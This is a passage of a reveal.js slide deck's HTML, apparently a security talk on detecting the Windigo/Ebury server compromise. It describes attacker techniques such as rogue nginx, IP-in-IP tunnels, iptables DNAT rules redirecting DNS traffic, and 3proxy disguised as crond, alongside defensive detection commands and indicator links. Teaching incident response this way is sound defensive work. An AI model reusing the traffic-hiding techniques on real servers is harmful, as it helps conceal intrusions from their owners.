}
...
server {
    listen			19xx;
    listen			443;

    ssl 			on;
    ssl_certificate		/boot/conf/certificate.pem;
    ssl_certificate_key	/boot/conf/secret_key.key;
    ...
}</code></pre></div></div></section>
<section id="_protip_11" data-background="#125F79"><h2>Protip</h2><div class="ulist"><ul><li><p><code>ps -ef</code></p></li><li><p><code>netstat -anp</code></p></li></ul></div>
<aside class="notes"><div class="paragraph"><p>or whatever your favorite flags of ps</p></div></aside></section>
<section id="_example_netstat_output" data-background="#125F79"><h2>Example netstat output</h2><div class="listingblock"><div class="content"><pre class="highlight"><code>Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      keepalive (0.00/0/0)
tcp        0      0 xxx.xxx.139.250:443     xxx.x.59.72:55765       SYN_RECV    on (2.89/0/0)
tcp        0      0 xxx.xxx.139.250:443     xx.xxx.236.11:47401     SYN_RECV    on (2.89/0/0)
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:1905            0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 xxx.xxx.139.250:443     xxx.xxx.141.83:35679    TIME_WAIT   timewait (52.61/0/0)
tcp        0      0 xxx.xxx.139.250:22      xx.xx.127.142:27255     ESTABLISHED keepalive (5947.19/0/0)
tcp        0      0 xxx.xxx.139.250:443     xxx.xxx.103.38:55600    TIME_WAIT   timewait (51.27/0/0)
tcp        0      0 xxx.xxx.139.250:443     xx.xx.161.2:46744       TIME_WAIT   timewait (36.74/0/0)
tcp        0      0 xxx.xxx.139.250:443     xxx.xxx.103.38:55601    TIME_WAIT   timewait (53.44/0/0)
tcp        0  50680 xxx.xxx.139.250:443     xx.xxx.75.39:23944      ESTABLISHED on (0.32/0/0)
tcp        0      0 xxx.xxx.139.250:443     xx.xx.161.2:46740       TIME_WAIT   timewait (25.77/0/0)
tcp        0    688 xxx.xxx.139.250:56624   xxx.x.36.17:4xx35       ESTABLISHED on (0.72/0/0)
tcp        0      0 xxx.xxx.139.250:22      xx.xx.127.142:27302     ESTABLISHED keepalive (6115.04/0/0)
tcp        0      0 xxx.xxx.139.250:56455   xxx.x.36.17:4xx35       TIME_WAIT   timewait (9.20/0/0)
tcp        0      0 xxx.xxx.139.250:22      xx.xx.127.142:27398     ESTABLISHED keepalive (7092.41/0/0)
tcp        0      0 xxx.xxx.139.250:56446   xxx.x.36.17:4xx35       TIME_WAIT   timewait (5.72/0/0)
tcp        0      0 xxx.xxx.139.250:56568   xxx.x.36.17:4xx35       TIME_WAIT   timewait (41.33/0/0)
tcp        0      0 xxx.xxx.139.250:443     xxx.x.177.54:33968      ESTABLISHED off (0.00/0/0)
tcp        0      0 xxx.xxx.139.250:56526   xxx.x.36.17:4xx35       TIME_WAIT   timewait (26.33/0/0)
tcp        0      0 xxx.xxx.139.250:56463   xxx.x.36.17:4xx35       TIME_WAIT   timewait (10.97/0/0)</code></pre></div></div></section>
<section id="_ip_in_ip_tunnels"><h2>IP in IP tunnels</h2><div class="ulist"><ul><li><p>Through infected servers</p></li><li><p>Used to hide all sort of traffic (ssh, browser, etc.)</p></li><li><p>Layers of tunneling found</p></li></ul></div></section>
<section id="_what_are_ip_in_ip_tunnels"><h2>What are IP in IP tunnels</h2><div class="ulist"><ul><li><p>Handled by the kernel</p></li><li><p>Created with <code>ifconfig</code> or <code>iproute2</code> suite</p></li><li><p>Point-to-point link that encapsulate IP inside IP</p></li><li><p>Transport independant</p></li></ul></div>
<aside class="notes"><div class="paragraph"><p>Just quickly. They are more flexible than reverse proxy / ssh tunnels</p></div></aside></section>
<section id="_inside_the_tunnels"><h2>Inside the tunnels</h2><div class="paragraph"><p>Doing TTL and traffic analysis we found.</p></div>
<div class="ulist"><ul><li><p>The machines' OS using the tunnels (FreeBSD, Windows, Linux)</p></li><li><p>Mostly ssh, ftp</p></li><li><p># of hops</p></li><li><p>Several GB of traffic (3 RX / 8 TX)</p></li><li><p>Monitoring Ebury infected machines</p></li><li><p>Trying passwords on Internet facing ssh / ftp</p></li></ul></div></section>
<section id="_protip_12" data-background="#125F79"><h2>Protip</h2><div class="ulist"><ul><li><p><code>ifconfig</code> and look for: <code>Link encap:IPIP Tunnel</code></p></li><li><p><code>ip tunnel show</code></p></li></ul></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code>tunl0: ip/ip  remote any  local any  ttl inherit  nopmtudisc
tun10: ip/ip  remote xx.xx.201.34  local xxx.xxx.232.18  dev eth0  ttl inherit
sit0: ipv6/ip  remote any  local any  ttl 64  nopmtudisc</code></pre></div></div>
<div class="ulist"><ul><li><p><code>ip route show</code></p></li></ul></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code>10.12.12.0/30 dev tun10  proto kernel  scope link  src 10.12.12.2</code></pre></div></div>
<div class="ulist"><ul><li><p><code>iptables -t nat -L -nv</code></p><div class="ulist"><ul><li><p>post-routing source NAT to map tunnel traffic to eth0 IP</p></li></ul></div></li></ul></div></section>
<section id="_iptables"><h2>iptables</h2><div class="ulist"><ul><li><p>Rules in the NAT table to bounce traffic of compromised servers</p></li></ul></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code>-A PREROUTING -d xx.xx.51.14/32 -p udp -m udp --dport 53 -j DNAT --to-destination xxx.xx.225.200:53
-A POSTROUTING -d xxx.xx.225.200/32 -p udp -m udp --dport 53 -j SNAT --to-source xx.xx.51.14</code></pre></div></div>
<aside class="notes"><div class="paragraph"><p>Sometimes rules aren&#8217;t persistent</p></div></aside></section>
<section id="_protip_13" data-background="#125F79"><h2>Protip</h2><div class="ulist"><ul><li><p>Audit your iptables rules</p></li></ul></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code>iptables -t nat -L -nv</code></pre></div></div></section>
<section id="_3proxy"><h2>3Proxy</h2><div class="ulist"><ul><li><p>Tiny free cross-platform multi-protocol proxy server</p></li><li><p>Not malware (strings not obfuscated)</p></li><li><p>Sometimes hidden as <code>crond</code></p></li></ul></div>
<aside class="notes"><div class="paragraph"><p>not much to say</p></div></aside></section>
<section id="_protip_14" data-background="#125F79"><h2>Protip</h2><div class="ulist"><ul><li><p>strings</p></li></ul></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code>$ strings crond | grep 3proxy
Documentation and sources: http://www.security.nnov.ru/soft/3proxy/
3proxy@</code></pre></div></div>
<div class="ulist"><ul><li><p><code>ps -ef</code></p></li><li><p><code>netstat -anp</code></p></li></ul></div></section>
<section id="_recap_4" data-background="#797620"><h2>Recap</h2><div class="ulist step"><ul><li class="fragment"><p>Look for</p><div class="ulist"><ul><li><p>kernel-level: IP in IP, iptables</p></li><li><p>binaries: rogue nginx, 3Proxy, SSH tunnels</p></li></ul></div></li><li class="fragment"><p>With</p><div class="ulist"><ul><li><p><code>iptables</code>, <code>ip tunnel show</code>, <code>ps</code>, <code>netstat</code></p></li></ul></div></li></ul></div></section>
<section id="_indicators_of_compromise"><h2>Indicators of Compromise</h2><div class="paragraph"><p>We released so-called IOCs</p></div>
<div class="ulist"><ul><li><p><a href="https://github.com/eset/malware-ioc/tree/master/windigo" class="bare">https://github.com/eset/malware-ioc/tree/master/windigo</a></p></li><li><p><a href="https://www.cert-bund.de/ebury-faq" class="bare">https://www.cert-bund.de/ebury-faq</a></p></li><li><p>[BEST] Contact us: <a href="mailto:windigo@eset.sk">windigo@eset.sk</a></p></li></ul></div>
<aside class="notes"><div class="paragraph"><p>We stopped updating them because they were worked-around quickly after we
updated them</p></div>
<div class="paragraph"><p>With all these techniques, it&#8217;s not hard to understand why seizing servers
and analysing disks will not suffice.</p></div></aside></section>
<section id="_closing_words" data-background="#797620"><h2>Closing words</h2><div class="ulist step"><ul><li class="fragment"><p>Be creative on the bad guys (legally)</p></li><li class="fragment"><p>Out-of-band cannot lie</p></li><li class="fragment"><p>Native tools can help a lot</p></li><li class="fragment"><p>Send us anything suspect you find!</p><div class="paragraph"><p><a href="mailto:windigo@eset.sk">windigo@eset.sk</a></p></div></li></ul></div>
<aside class="notes"><div class="paragraph"><p>Tools: Until they lie&#8230;&#8203; It&#8217;s an arm&#8217;s race.</p></div></aside></section>
<section id="__logout"><h2>:~$ logout</h2><div class="ulist"><div class="title">Thanks!</div><ul><li><p>Questions?</p></li><li><p><a href="http://twitter.com/obilodeau">@obilodeau</a></p></li><li><p><a href="mailto:windigo@eset.sk">windigo@eset.sk</a></p></li></ul></div></section></div></div><script src="reveal.js/lib/js/head.min.js"></script><script src="reveal.js/js/reveal.min.js"></script><script type="text/javascript">// Full list of configuration options available here:
// https://github.com/hakimel/reveal.js#configuration
 Reveal.initialize({

   // Display controls in the bottom right corner
   controls: false,

   // Display a presentation progress bar
   progress: true,

   // Display the page number of the current slide
   slideNumber: false,

   // Push each slide change to the browser history
   history: true,

   // Enable keyboard shortcuts for navigation
   keyboard: true,

   // Enable the slide overview mode
   overview: true,

   // Vertical centering of slides
   center: false,

   // Enables touch navigation on devices with touch input
   touch: true,

   // Loop the presentation
   loop: false,

   // Change the presentation direction to be RTL
   rtl: false,

   // Turns fragments on and off globally
   fragments: true,

   // Flags if the presentation is running in an embedded mode,
   // i.e. contained within a limited portion of the screen
   embedded: false,

   // Number of milliseconds between automatically proceeding to the
   // next slide, disabled when set to 0, this value can be overwritten
   // by using a data-autoslide attribute on your slides
   autoSlide: 0,

   // Stop auto-sliding after user input
   autoSlideStoppable: true,

   // Enable slide navigation via mouse wheel
   mouseWheel: false,

   // Hides the address bar on mobile devices
   hideAddressBar: true,

   // Opens links in an iframe preview overlay
   previewLinks: false,

   // Transition style
   transition: 'none', // default/cube/page/concave/zoom/linear/fade/none

   // Transition speed
   transitionSpeed: 'default', // default/fast/slow

   // Transition style for full page slide backgrounds
   backgroundTransition: 'slide', // default/none/slide/concave/convex/zoom

   // Number of slides away from the current that are visible
   viewDistance: 3,

   // Parallax background image
   parallaxBackgroundImage: '', // e.g. "'https://s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg'"

   // Parallax background size
   parallaxBackgroundSize: '', // CSS syntax, e.g. "2100px 900px"

   // Optional libraries used to extend on reveal.js
   dependencies: [
       { src: 'reveal.js/lib/js/classList.js', condition: function() { return !document.body.classList; } },
       { src: 'reveal.js/plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
       { src: 'reveal.js/plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
       { src: 'reveal.js/plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
       { src: 'reveal.js/plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
       { src: 'reveal.js/plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } }
   ]
 });</script></body></html>